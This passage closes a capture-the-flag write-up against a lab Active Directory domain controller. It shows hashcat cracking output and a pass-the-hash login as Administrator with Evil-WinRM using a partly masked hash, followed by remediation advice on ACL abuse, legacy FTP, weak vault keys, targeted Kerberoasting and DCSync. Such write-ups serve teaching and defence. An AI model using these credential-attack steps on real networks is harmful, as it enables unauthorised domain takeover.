Progress.........: 14344385/14344385 (100.00%)
Rejected.........: 0/14344385 (0.00%)
Restore.Point....: 14306608/14344385 (99.74%)
Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:0-1
Restore.Sub.#03..: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#01...: *:ashley*: -> $HEX[042a0337c2a156616d6f732103]
Candidates.#03...: *gkt*5600323*gre -> *<*(acidisulfurit
Hardware.Mon.#01.: Temp: 53c Util: 31% Core:1097MHz Mem:2505MHz Bus:8
Hardware.Mon.#03.: Temp: 76c Util: 36%

Started: Tue Mar 10 15:14:42 2026
Stopped: Tue Mar 10 15:14:46 2026
```

`Hashcat` output returns only the passwords clear text value for the accounts **already under our control**, so we proceed to utilize the Pass the Hash technique with `Evil-WinRM` to access the DC as the Administrator user:
```
$ evil-winrm -i 10.129.2.63 -u Administrator -H '3dc5xxxxxxxxxxxxxxxxxxxxxxxxfd2e'
<SNIP>
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
administrator\administrator
*Evil-WinRM* PS C:\Users\Administrator\Documents> hostname
dc
```

Exploring the content of the Desktop folder in the Administrator profile folder we reveal the last machine flag (**root.txt**) and its value:
```
*Evil-WinRM* PS C:\Users\Administrator\Documents> ls ../Desktop


    Directory: C:\Users\Administrator\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-ar---         3/10/2026   7:39 AM             34 root.txt


*Evil-WinRM* PS C:\Users\Administrator\Documents> type ../desktop/root.txt
3eebxxxxxxxxxxxxxxxxxxxxxxxxffd2
```

# 🛠️ Remediation
## 1. Insecure Active Directory Access Control (ACLs)
- **Audit Outbound Object Control**: Regularly scan the Active Directory environment using tools like BloodHound to identify and revoke dangerous "Incoming" and "Outbound" permissions (such as `GenericAll`, `GenericWrite`, and `ForceChangePassword`) assigned to standard user accounts.
- **Principle of Least Privilege (PoLP)**: Restrict the ability of users like **Olivia**, **Michael**, and **Emily** to modify other domain objects. Standard users should never possess administrative-level control over peer accounts unless there is a documented and verified business requirement.
- **Account Lockout & Monitoring**: Implement robust monitoring for Event ID 4724 (An attempt was made to reset an account's password). Frequent password changes performed by non-administrative users should trigger an automated security alert for investigation.

## 2. Insecure Data Storage & Legacy Protocols
- **Decommission Legacy Services**: Disable the Microsoft FTP service on the Domain Controller if it is not strictly required for business operations. For necessary file transfers, transition to secure alternatives such as SFTP or HTTPS-based solutions that support modern authentication.
- **Secure Backup Storage**: Ensure that sensitive files, such as **Password Safe (.psafe3)** databases or configuration backups, are stored in encrypted, restricted-access shares rather than publicly accessible directories.
- **Master Key Complexity**: Enforce strict entropy requirements for password database master keys. The compromise of the `Backup.psafe3` file was possible due to a master key that was vulnerable to simple dictionary attacks using standard word-lists like `rockyou.txt`.

## 3. Active Directory Persistence & Privilege Abuse
- **SPN Attribute Hardening**: Restrict the ability of non-privileged users to modify the `servicePrincipalName` (SPN) attribute of domain objects. This prevents attackers with `GenericWrite` permissions from performing "targeted Kerberoasting" to obtain crackable TGS hashes.
- **DCSync Prevention**: Monitor for and strictly limit the `DS-Replication-Get-Changes` and `DS-Replication-Get-Changes-All` permissions to authorized Domain Controllers and specific, highly-guarded backup accounts.
- **Tiered Administration**: Implement a tiered administrative model to ensure that accounts with high-level privileges (like **Ethan**, who possessed DCSync rights) are never logged into lower-tier, less-secure assets where their credentials could be harvested.


